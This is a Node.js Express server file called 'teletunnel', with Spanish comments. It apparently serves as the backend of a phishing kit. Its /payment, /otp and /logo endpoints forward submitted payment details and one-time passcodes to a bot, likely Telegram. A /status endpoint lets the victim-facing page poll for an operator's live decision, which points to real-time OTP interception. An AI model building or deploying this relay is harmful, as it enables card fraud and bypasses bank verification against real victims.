require('dotenv').config();

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');

const store = require('./store');
const { launch, sendPaymentCard, sendOtpCard, sendLogoCard } = require('./bot');

const app = express();
const PORT = process.env.PORT || 3000;
const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN || '*';
const PUBLIC_URL = process.env.PUBLIC_URL || '';

app.set('trust proxy', 1);
app.use(express.json({ limit: '64kb' }));
app.use(cors({ origin: ALLOWED_ORIGIN }));

// Rate limit suave por IP para evitar abuso
const limiter = rateLimit({
  windowMs: 60 * 1000,
  limit: 120,
  standardHeaders: true,
  legacyHeaders: false,
});
app.use(limiter);

// ===================== HEALTH =====================

app.get('/', (_req, res) => res.json({ ok: true, service: 'teletunnel', sessions: store.size() }));
app.get('/ping', (_req, res) => res.json({ ok: true, ts: Date.now() }));

// ===================== PAYMENT =====================

app.post('/payment', async (req, res) => {
  try {
    const body = req.body || {};
    if (!body.sessionId) return res.status(400).json({ ok: false, error: 'sessionId requerido' });

    const messageId = await sendPaymentCard(body);
    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('[/payment] error:', err);
    return res.status(500).json({ ok: false, error: 'send_failed' });
  }
});

// ===================== OTP =====================

app.post('/otp', async (req, res) => {
  try {
    const body = req.body || {};
    if (!body.sessionId) return res.status(400).json({ ok: false, error: 'sessionId requerido' });
    if (!body.otp) return res.status(400).json({ ok: false, error: 'otp requerido' });

    const messageId = await sendOtpCard(body);
    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('[/otp] error:', err);
    return res.status(500).json({ ok: false, error: 'send_failed' });
  }
});

// ===================== LOGO =====================

app.post('/logo', async (req, res) => {
  try {
    const body = req.body || {};
    if (!body.sessionId) return res.status(400).json({ ok: false, error: 'sessionId requerido' });

    const messageId = await sendLogoCard(body);
    return res.json({ ok: true, messageId });
  } catch (err) {
    console.error('[/logo] error:', err);
    return res.status(500).json({ ok: false, error: 'send_failed' });
  }
});

// ===================== STATUS (polling) =====================

app.get('/status/:sessionId', (req, res) => {
  // Evitar cache en navegadores / CDN intermedios
  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
  const s = store.get(req.params.sessionId);
  if (!s) return res.json({ decision: null, stage: null });
  return res.json({ decision: s.decision, stage: s.stage });
});

// ===================== AUTOPING =====================

if (PUBLIC_URL) {
  const url = PUBLIC_URL.replace(/\/$/, '') + '/ping';
  const tenMin = 10 * 60 * 1000;
  setInterval(() => {
    fetch(url)
      .then(r => console.log(`[autoping] ${url} -> ${r.status}`))
      .catch(e => console.warn('[autoping] fail:', e.message));
  }, tenMin).unref();
  console.log(`[autoping] cada 10 min -> ${url}`);
} else {
  console.warn('[autoping] PUBLIC_URL no configurado — autoping deshabilitado');
}

// ===================== BOOT =====================

// IMPORTANTE: Express PRIMERO (para que Render detecte el puerto) y el bot
// en paralelo. bot.launch() con long-polling NO resuelve su promesa hasta
// que el bot se detenga, así que NUNCA lo podemos await-ear aquí.
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[http] teletunnel escuchando en :${PORT}`);
});

launch().catch(err => {
  console.error('[bot] no pude iniciar:', err);
  // Aunque el bot falle el HTTP sigue arriba — health check OK.
});
